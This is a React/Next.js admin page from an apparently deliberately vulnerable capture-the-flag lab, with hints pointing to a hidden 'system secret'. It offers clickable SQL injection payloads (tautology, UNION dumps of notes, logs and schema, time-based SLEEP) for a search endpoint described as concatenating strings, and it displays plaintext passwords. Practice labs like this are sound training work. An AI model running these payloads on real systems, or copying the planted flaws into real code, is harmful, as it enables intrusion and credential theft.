'use client';

import { useEffect, useState } from 'react';
import Link from 'next/link';
import Sidebar from '@/components/Sidebar';

export default function AdminUsers() {
  const [users, setUsers] = useState<any[]>([]);
  const [query, setQuery] = useState('');
  const [results, setResults] = useState<any[]>([]);
  const [searched, setSearched] = useState(false);
  const [showPayloads, setShowPayloads] = useState(false);
  const [activePayload, setActivePayload] = useState('');

  useEffect(() => {
    fetch('/api/admin/users')
      .then(r => r.json())
      .then(d => setUsers(d.users || []));
  }, []);

  const handleSearch = async () => {
    const res = await fetch(`/api/search?query=${encodeURIComponent(query)}`);
    const data = await res.json();
    setResults(data.results || []);
    setSearched(true);
  };

  const payloads = [
    { label: "Dump All", val: "' OR '1'='1" },
    { label: "UNION: Notes", val: "' UNION SELECT id,note,note,note FROM admin_notes--" },
    { label: "UNION: Logs", val: "' UNION SELECT id,action,ip,details FROM server_logs--" },
    { label: "DB Info", val: "' UNION SELECT 1,database(),version(),user()--" },
    { label: "Schema", val: "' UNION SELECT 1,table_name,table_schema,NULL FROM information_schema.tables--" },
    { label: "Time-Based", val: "admin' AND SLEEP(3)--" },
  ];

  const inject = (val: string) => { 
    setQuery(val); 
    setActivePayload(val); 
  };

  return (
    <div className="flex min-h-screen bg-[#050507] text-slate-300">
      <Sidebar />

      <main className="flex-1 p-8 overflow-y-auto">
        {/* Header */}
        <header className="mb-8 animate-in fade-in slide-in-from-top-4 duration-700">
          <div className="flex justify-between items-center">
            <div>
              <h1 className="text-3xl font-bold tracking-tighter text-white uppercase italic">User Management</h1>
              <p className="text-xs font-mono text-slate-500 mt-1">// MODULE: AUTH_BYPASS_SEARCH // DB: EXPOSED</p>
            </div>
            <div className="flex gap-3">
              <Link href="/admin" className="px-3 py-1.5 rounded border border-slate-800 text-[10px] font-bold uppercase tracking-widest hover:bg-slate-800 transition-all">
                Admin Root
              </Link>
            </div>
          </div>
        </header>

        {/* SQLi Vulnerability Dossier */}
        <section className="mb-8 rounded-2xl border border-orange-900/30 bg-orange-950/5 p-6 backdrop-blur-md animate-in fade-in slide-in-from-bottom-4 duration-700">
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center gap-2">
              <span className="px-2 py-0.5 rounded bg-orange-500 text-black text-[9px] font-black">CRITICAL VULN</span>
              <span className="text-[10px] font-black text-orange-500 uppercase tracking-widest">SQL Injection + Data Exposure</span>
            </div>
          </div>
          
          <p className="text-xs text-slate-400 leading-relaxed mb-6 font-mono">
            Endpoint <code className="text-orange-400">/api/search?query=</code> performs direct string concatenation. 
            Resulting in <span className="text-white underline">Full Database Pivot</span> potential. 
            Database also stores <span className="text-red-500 font-bold">Plaintext Credentials</span>.
          </p>

          <div className="space-y-4">
            <button 
              onClick={() => setShowPayloads(!showPayloads)}
              className="text-[10px] font-bold text-orange-500/70 hover:text-orange-400 transition-colors uppercase tracking-[0.2em]"
            >
              {showPayloads ? '[ - ] Collapse Payloads' : '[ + ] Expand Injection Payloads'}
            </button>

            {showPayloads && (
              <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-2 animate-in zoom-in-95 duration-300">
                {payloads.map(p => (
                  <button
                    key={p.val}
                    onClick={() => inject(p.val)}
                    className={`px-2 py-2 rounded border text-[9px] font-mono transition-all ${
                      activePayload === p.val 
                        ? "bg-orange-500/20 border-orange-500 text-orange-300" 
                        : "bg-black/40 border-slate-800 text-slate-500 hover:border-slate-600"
                    }`}
                  >
                    ⚡ {p.label}
                  </button>
                ))}
              </div>
            )}
            
            <div className="flex items-center gap-3 p-3 bg-black/40 border border-slate-800 rounded-lg">
              <span className="text-lg">🚩</span>
              <span className="text-[10px] font-mono text-slate-400">
                HINT: Pivot to <code className="text-blue-400">admin_notes</code> for the system secret.
              </span>
            </div>
          </div>
        </section>

        {/* Search Interface */}
        <section className="grid grid-cols-1 gap-6 mb-12">
          <div className="p-6 rounded-2xl bg-slate-900/30 border border-slate-800">
            <div className="flex gap-4">
              <div className="relative flex-1 group">
                <input
                  type="text"
                  placeholder="Intercept Query..."
                  value={query}
                  onChange={e => setQuery(e.target.value)}
                  onKeyDown={e => e.key === 'Enter' && handleSearch()}
                  className="w-full bg-black border border-slate-800 rounded-xl py-4 px-5 font-mono text-xs text-orange-400 focus:outline-none focus:border-orange-500/50 transition-all shadow-inner"
                />
              </div>
              <button 
                onClick={handleSearch}
                className="px-8 bg-blue-600 hover:bg-blue-500 text-white rounded-xl text-xs font-bold uppercase tracking-[0.2em] transition-all shadow-lg shadow-blue-900/20"
              >
                Execute
              </button>
            </div>

            {searched && (
              <div className="mt-8 animate-in fade-in slide-in-from-top-2 duration-500">
                <div className="flex justify-between items-center mb-4 px-2">
                  <h3 className="text-[10px] font-black text-slate-500 uppercase tracking-widest">Intercepted Results</h3>
                  <span className="text-[10px] font-mono text-orange-500/70">Rows: {results.length}</span>
                </div>
                
                <div className="rounded-xl border border-slate-800 bg-black/20 overflow-hidden">
                  <table className="w-full text-left text-[11px] font-mono">
                    <thead className="bg-slate-900/50 text-slate-600 border-b border-slate-800">
                      <tr>
                        <th className="px-4 py-3">RAW_01</th>
                        <th className="px-4 py-3 text-blue-400/70">RAW_02</th>
                        <th className="px-4 py-3 text-red-400/70">RAW_03</th>
                        <th className="px-4 py-3">RAW_04</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-slate-800/30">
                      {results.map((r: any, i: number) => (
                        <tr key={i} className="hover:bg-blue-500/[0.02]">
                          <td className="px-4 py-3 text-slate-500">{r.id ?? r[0]}</td>
                          <td className="px-4 py-3 text-blue-400">{r.username ?? r[1]}</td>
                          <td className="px-4 py-3 text-red-500 font-bold">{r.password ?? r[2]}</td>
                          <td className="px-4 py-3 text-slate-400">{r.role ?? r[3]}</td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>
            )}
          </div>
        </section>

        {/* Master Database Exposure */}
        <section className="rounded-2xl border border-slate-800 bg-slate-900/10 overflow-hidden animate-in fade-in delay-500">
          <div className="px-6 py-4 bg-slate-900/40 border-b border-slate-800 flex justify-between items-center">
            <h2 className="text-[10px] font-black text-slate-400 uppercase tracking-[0.2em]">Master User Table [INTERNAL_ONLY]</h2>
            <span className="text-[9px] font-bold text-red-500 uppercase animate-pulse italic">Encryption: Disabled</span>
          </div>
          <div className="overflow-x-auto">
            <table className="w-full text-left text-[11px]">
              <thead className="bg-slate-950 text-slate-600 font-mono">
                <tr>
                  <th className="px-6 py-4 font-medium uppercase tracking-tighter">UID</th>
                  <th className="px-6 py-4 font-medium uppercase tracking-tighter">Username</th>
                  <th className="px-6 py-4 font-medium uppercase tracking-tighter text-red-400">Cleartext Pass</th>
                  <th className="px-6 py-4 font-medium uppercase tracking-tighter">Identity</th>
                  <th className="px-6 py-4 font-medium uppercase tracking-tighter text-center">Status</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-800/50">
                {users.map((u: any) => (
                  <tr key={u.id} className="group hover:bg-slate-800/30 transition-colors">
                    <td className="px-6 py-4 font-mono text-slate-500 text-[10px]">#{u.id}</td>
                    <td className="px-6 py-4 font-bold text-slate-200">{u.username}</td>
                    <td className="px-6 py-4">
                      <span className="px-2 py-1 rounded bg-red-500/5 border border-red-500/20 text-red-400 font-mono group-hover:bg-red-500/10 transition-all">
                        {u.password}
                      </span>
                    </td>
                    <td className="px-6 py-4 font-mono text-slate-500 text-[10px]">{u.email}</td>
                    <td className="px-6 py-4 text-center">
                      <span className={`px-2 py-0.5 rounded-[4px] text-[9px] font-black uppercase ${
                        u.role === 'admin' ? 'bg-amber-500/10 text-amber-500 border border-amber-500/20' : 'bg-blue-500/10 text-blue-500 border border-blue-500/20'
                      }`}>
                        {u.role}
                      </span>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </section>
      </main>
    </div>
  );
}